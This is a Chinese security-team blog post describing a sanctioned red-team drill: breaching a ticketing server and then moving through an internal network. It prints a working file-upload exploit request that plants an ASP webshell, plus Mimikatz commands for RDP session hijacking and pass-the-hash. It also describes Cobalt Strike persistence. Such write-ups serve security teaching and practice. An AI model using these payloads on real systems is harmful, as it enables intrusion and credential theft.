---
title: 攻防演练实战小记
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247517699&idx=1&sn=12fff27bf783f329eda85e40479f79e5&chksm=ce5da462f92a2d74e0c002ecaeb67109af221f4c3b66a97db11e7b168f66326f2a4ef60d45f7&scene=58&subscene=0#rd
source: Tide安全团队
date: 2024-12-17
fetch_date: 2025-10-06T19:40:36.986675
---

# 攻防演练实战小记

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNSX7v4L44btbQ4xukibrhwB8A3ictJFHQQnQXEYpsiaUydaJfqUmXpD4xg/0?wx_fmt=jpeg)

# 攻防演练实战小记

原创

komorebi

Tide安全团队

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png)

声明：Tide安全团队原创文章，转载请声明出处！文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png)

## 0x01 背景

参加了某次地市攻防演练，限制目标单位但不限目标系统，只要能够证明属于攻击单位目标资产的系统均可计分。主要规则：一、获取权限（攻击路径）：得分上限的对象是单个防守单位及其所有下属机构。根据不同系统不同权限给分
二、突破网络边界：整个目标单位突破同一类网络边界只给一次分。三、获取目标系统权：互联网、业务内网、核心生产网。四、数据分，不再一一介绍

## 0x02 获取服务器权限

通过信息收集获取目标单位备案IP

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNxnTouksOsib2lGMALk9NQIasr9iaC14VKTKrXqa3c6m852eor4mFJ8yw/640?wx_fmt=png&from=appmsg)

hunter和夸克等资产引擎上可利用的信息有但不多。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNxnTouksOsib2lGMALk9NQIasr9iaC14VKTKrXqa3c6m852eor4mFJ8yw/640?wx_fmt=png&from=appmsg)

全端口扫描发现某票务系统

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNrPDlX4GOwso2vGd8lTnCphAq5F3dAI7pyFunoNK5lLDLRm30XfpUcw/640?wx_fmt=jpeg&from=appmsg)

根据已知poc，通过文件上传漏洞获取服务器webshell

```
POST /SystemManager/Comm/CommFunHandler.ashx HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
Content-Length: 873

----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="1.txt"

<%Response.Write("this is test")
%>
----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

1.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UploadZoneImg
----------------------------354575237365372692397370
Content-Disposition: form-data; name="solutionNo"

----------------------------354575237365372692397370
Content-Disposition: form-data; name="siteNo"

1
----------------------------354575237365372692397370
Content-Disposition: form-data; name="showNo"

1
----------------------------354575237365372692397370
Content-Disposition: form-data; name="showingNo"

1
----------------------------354575237365372692397370--
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNrPDlX4GOwso2vGd8lTnCphAq5F3dAI7pyFunoNK5lLDLRm30XfpUcw/640?wx_fmt=jpeg&from=appmsg)

但是获取asp webshell后发现存在许多问题。目前已知：

1、上传后的asp马权限低，无法在其他web目录上传文件，也无法使用冰蝎、哥斯拉等工具的代理转发功能。

2、另外经过不断的测试，发现当前服务器利用这个poc只能传asp，aspx、ashx等格式文件均跳转，猜测已经做过一定的防护。

 3、reg、suo5等脚本均不执行。目前来看，除了想办法提权也没想到其他好方法，但提权后机器不出网，以高权限写入其他格式文件依旧不执行。在想办法如何进行下一步的时候，burp插件提示网站存在ueditor，决定利用这个上传点试一下。（（后期复盘发现并非所有采用该CMS的网站都存在ueditor路径，有些访问是404，实际测试的时候可以访问试一下）

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNpq9lpI9jvMNGS5Kcv3licraTe4ibibTGy3YTWsAo3a7wtqwWXYxib3Y4bg/640?wx_fmt=png&from=appmsg)

经过测试发现可上传asmx格式的webshell（此截图为webshell管理工具的缓存会话）

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNSyqeHvZp93Zt6uOtpKKAvAmZQMyDOiaVasR57OHQX3nzk9EUPCUb28g/640?wx_fmt=png&from=appmsg)

使用tscanplus中的提权辅助工具获取可利用的提权漏洞信息,提权并添加系统管理员权限账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNIqRIYGlKM4eBrRgEY9gySN2ibNYZtqibAThRb9WRQn5oJuYMuJFzvLbQ/640?wx_fmt=png&from=appmsg)

查询3389服务状态和端口

```
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

```
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNIqRIYGlKM4eBrRgEY9gySN2ibNYZtqibAThRb9WRQn5oJuYMuJFzvLbQ/640?wx_fmt=png&from=appmsg)

使用HTTP代理功能，监听18888端口，以新添加大的管理员权限的账户访问被控服务器

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DN9VKbd7ygia6ZZBbjD8UXL1zjjczibIlZqVnX4X92GoDFEHofMxnHiaicYw/640?wx_fmt=png&from=appmsg)

2012R2版本系统，考虑RDP劫持服务器管理员桌面

```
privilege::debug #提权
ts::sessions #查看当前主机的会话
token::elevate #提升本地管理员权限为system
ts::remote /id:2 #劫持id为2的会话
```

或者

```
privilege::debug
sekurlsa::pth /user:9821 /domain:DESKTOP-6RVIHJ2 /ntlm:e5df2c988f0d77ef35a9bdc95b5 "/run:mstsc.exe /restrictedadmin"
```

（本地虚拟机复现）

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNGPAnX3XdicZM5cbEOHtJPic1lAmeacwIcTkDFNWktRXISpFqdfEzpzxg/640?wx_fmt=png&from=appmsg)

## 0x03 内网横向

虽然当前获取了一台服务器权限，但只以当前转发HTTP流量的方式还是比较脆弱，最好多找几台内网的出网机器上线CS或者直接挂frp。tscan扫描内网发现一台部署了用友财务系统的机器importhttpscer接口处存在任意文件上传漏洞且可以正常出网，获取webshell后直接上线cs

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DN6QToheU9BVT9QvraWOv5I7rGy2NtEBauZYxtxQYR48LRWJa3sic0qyQ/640?wx_fmt=png&from=appmsg)

上线后找个进程注入payload，简单做一下权限维持（截图仅为记录思路，实际测试可以多找几台）

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNAvHia984utagtQmazicRxvJ1LFboiaPq4IG4mlY3IF4tE1cuOn8ty23FQ/640?wx_fmt=jpeg&from=appmsg)

有了跳板机，做了权限维持后，普通内网，接下来就是用tscan收集信息横向即可。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RU50NIToJrWAvWlIQnZic5DNMurJrtyxV9w0aVpRYEicrEmz7JnbWsoVnbbeXwsx5YK0vcCfEQH0ekg/640?wx_fmt=png&from=appmsg)

往期推荐

[TscanPlus-一款红队自动化工具](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247516589&idx=1&sn=107da3b45e88255f240504d033ebde7f&chksm=ce5da3ccf92a2adab0511bd798570d967cd4b0b7d7528f2f17163f5ed77e4dd7a02ac17c39d7&scene=21#wechat_redirect)

[潮影在线免杀平台上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499902&idx=1&sn=59cba8d980b4ecb0deefff99edaabd4d&chksm=ce5de21ff92a6b09a8972a0144557b0099e443aa8e018b17151c816fc7f08f3615ecb22617fc&scene=21#wechat_redirect)

[自动化渗透测试工具开发实践](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498466&idx=1&sn=085c15679436dedb06a179ca8d47951a&chksm=ce5dd883f92a5195ef74ac517741f6d3da0da40b5501d72016e52cb70344904bb85b8aef65ba&scene=21#wechat_redirect)

[【红蓝对抗】利用CS进行内网横向](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492640&idx=1&sn=43b1991dc5628eab322923083fde8d70&chksm=ce5dc641f92a4f57ffb18e2977644b1f977fcc5e0eccdf10956d3ae4ce70dc95024500631e89&scene=21#wechat_redirect)

[一个Go版(更强大)的TideFinger](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498344&idx=1&sn=3679330363ff6890166b09f6a502f769&chksm=ce5dd809f92a511f6066fcbb12fb5c1dc8c2642e4e2690dad64d76cc6f9247eae356d16f5810&scene=21#wechat_redirect)

[SRC资产导航监测平台Tsrc上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499823&idx=1&sn=065ffeae6bd02fff922cfb12c5a0f4df&chksm=ce5de24ef92a6b58f709260b691e6b36e4a53aac00d3022946302b8e638696ed55c70e13e16f&scene=21#wechat_redirect)

[新潮信息-Tide安全团队2022年度总结](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247506056&idx=1&sn=ad6dd23f58f5fd8ce899a1e292f5b685&chksm=ce5dfae9f92a73ff4f14c812436cb5bfecb29db04eada11c409e946d5338c82a92bcaa425736&scene=21#wechat_redirect)

[记一次实战攻防(打点-Edr-内网-横向-Vcenter)](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498965&idx=1&sn=655548831da6808a020ad07294a92e60&chksm=ce5ddeb4f92a57a283d5692c246e54655319ab0d09f6403e354300a2777cda6ae4c787631ab3&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQUrLN62vEGlA4fPmib5utUAp9gbQicb6FC82RjsVI5vx7wEc9yAAiaFEoQ/640?wx_fmt=gif)

E

N

D

**Tide团队产品及服务**

**团队自研平台**：潮汐在线指纹识别平台 | 潮听漏洞情报平台 | 潮巡资产管理与威胁监测平台 | 潮汐网络空间资产测绘 | 潮声漏洞检测平台 | 在线免杀平台 | CTF练习平台 | 物联网固件检测平台 | SRC资产监控平台  | ......

**技术分享方向**:Web安全 | 红蓝对抗 | 移动安全 | 应急响应 | 工控安全 | 物联网安全 | 密码学 | 人工智能 | ctf 等方面的沟通及分享

**团队知识wiki**：红蓝对抗 | 漏洞武器库 | 远控免杀 | 移动安全 | 物联网安全 | 代码审计 | CTF | 工控安全 | 应急响应 | 人工智能 | 密码学 | CobaltStrike | 安全测试用例 | ......

**团队网盘资料**：安全法律法规 | 安全认证资料 | 代码审计 | 渗透安全工具 | 工控安全工具 | 移动安全工具 | 物联网安全 | 其它安全文库合辑  | ......

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXKdic2aeSueSKVcSe4bg4FWpNcMVuVlfknlaOFhE5qxE5QhwDUrw1tAb8eibJcxIbqPicibfnAZibfg4A/0?wx_fmt=png)

Tide安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/r...